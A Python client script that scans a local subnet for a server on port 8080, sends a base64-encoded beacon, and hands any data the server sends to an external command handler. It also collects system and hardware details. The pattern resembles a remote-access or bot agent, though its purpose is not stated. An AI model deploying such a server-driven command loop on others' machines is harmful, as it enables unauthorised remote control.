import tqdm
import os
import platform
import GPUtil
import multiprocessing as mp
import socket
import psutil
import tools
import command_line as cmd

def locate_server(server_port):
    
    for i in range(2,100):
        server_ip = f"192.168.1.{i}" 
        try:
            connection_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
            connection_socket.settimeout(10)
    
            print(f"[+] Trying connection with {server_ip}")
            connection_socket.connect((server_ip,server_port))
            connection_socket.send(b'VEhJUyBXT1JMRCBTSEFMTCBLTk9XIFBBSU4u')
            connection_socket.close()

            print(f"[+] Server located at {server_ip}")

            break
    
        except OSError as exception:
            print(f"[ERROR] {exception}")
            print(f"[-] Connection refused with {server_ip}")
            connection_socket.close()

    connection_socket.close()
    return server_ip

def receive_data(connection,address,buffer_size):
    #PARSE COMMAND AND EXECUTE IT
    print(f"[{address}] Listening for incoming data")

    while True:
        try:
            data = connection.recv(buffer_size).decode()
            print(f"[{address}] {data}")
            cmd.command_line(connection, address, buffer_size, data)
            #except ConnectionResetError,ConnectionAbortedError:
        except ConnectionError:
            print(f"[-] Connection with {address} lost")
            connection.close()

            return
    

def send_data(connection,address,data):
    try:
        connection.send(data.encode())
    except ConnectionError as exception:
        print(f"[!] {exception}")
        print(f"[-] Connection with {address} lost")


def get_local_ip(client,hostname):
    
    local_ip = socket.gethostbyname(hostname)

    if local_ip.startswith('127.'):
        print("[+] Getting local ip by UDP...")
        udp_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        udp_socket.connect(('8.8.8.8',80))
        local_ip = udp_socket.getsockname()[0]
        udp_socket.close()
    
    return local_ip


def get_system_info():
    uname = platform.uname()

    system = uname.system
    release = uname.release 
    cpu = uname.processor
    network_interface = psutil.net_if_stats()
    gpus = GPUtil.getAvailable()

    return {
        "system" : system,
        "release" : release,
        "gpus" : gpus,
        "cpu" : cpu,
        "network_interface" : network_interface
        }


if __name__ == "__main__":
    locate_server(8080)
